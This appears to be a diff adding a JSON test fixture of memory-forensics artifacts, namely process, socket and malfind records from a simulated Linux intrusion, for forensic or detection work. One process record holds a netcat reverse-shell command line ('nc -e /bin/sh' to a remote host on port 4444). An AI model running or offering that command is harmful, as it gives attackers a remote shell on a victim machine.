@@ -1,0 +1,73 @@
+[
+  {
+    "artifact_id": "MEMPROC-aaaaaaaa-1111-4111-8111-111111111111",
+    "evidence_id": "MEM-11111111-2222-4333-8444-555555555555",
+    "pid": 1030,
+    "ppid": 1,
+    "process_name": "sshd",
+    "source_plugin": "linux.pslist.PsList",
+    "created_at": "2026-10-21T07:12:15+00:00",
+    "raw_attributes": {
+      "cmdline": "sshd: user_1002 [priv]"
+    }
+  },
+  {
+    "artifact_id": "MEMPROC-bbbbbbbb-2222-4222-8222-222222222222",
+    "evidence_id": "MEM-11111111-2222-4333-8444-555555555555",
+    "pid": 1045,
+    "ppid": 1030,
+    "process_name": "bash",
+    "source_plugin": "linux.pslist.PsList",
+    "created_at": "2026-10-21T07:15:22+00:00",
+    "raw_attributes": {
+      "cmdline": "/bin/bash"
+    }
+  },
+  {
+    "artifact_id": "MEMPROC-cccccccc-3333-4333-8333-333333333333",
+    "evidence_id": "MEM-11111111-2222-4333-8444-555555555555",
+    "pid": 1050,
+    "ppid": 1045,
+    "process_name": "nc",
+    "source_plugin": "linux.pslist.PsList",
+    "created_at": "2026-10-21T07:17:10+00:00",
+    "raw_attributes": {
+      "cmdline": "nc -e /bin/sh 203.0.113.88 4444"
+    }
+  },
+  {
+    "artifact_id": "MEMNET-dddddddd-4444-4444-8444-444444444444",
+    "evidence_id": "MEM-11111111-2222-4333-8444-555555555555",
+    "protocol": "TCP",
+    "local_address": "0.0.0.0",
+    "local_port": 22,
+    "state": "LISTEN",
+    "pid": 1024,
+    "process_name": "sshd",
+    "source_plugin": "linux.sockscan.SockScan",
+    "raw_attributes": {}
+  },
+  {
+    "artifact_id": "MEMNET-eeeeeeee-5555-4555-8555-555555555555",
+    "evidence_id": "MEM-11111111-2222-4333-8444-555555555555",
+    "protocol": "TCP",
+    "local_address": "192.0.2.10",
+    "local_port": 49152,
+    "remote_address": "203.0.113.88",
+    "remote_port": 4444,
+    "state": "ESTABLISHED",
+    "pid": 1050,
+    "process_name": "nc",
+    "source_plugin": "linux.sockscan.SockScan",
+    "raw_attributes": {}
+  },
+  {
+    "artifact_id": "MEMMOD-ffffffff-6666-4666-8666-666666666666",
+    "evidence_id": "MEM-11111111-2222-4333-8444-555555555555",
+    "module_name": "/lib/x86_64-linux-gnu/libpam.so.0",
+    "source_plugin": "linux.malfind.Malfind",
+    "base_address": "0x7f1234560000",
+    "size_bytes": 65536,
+    "raw_attributes": {}
+  }
+]
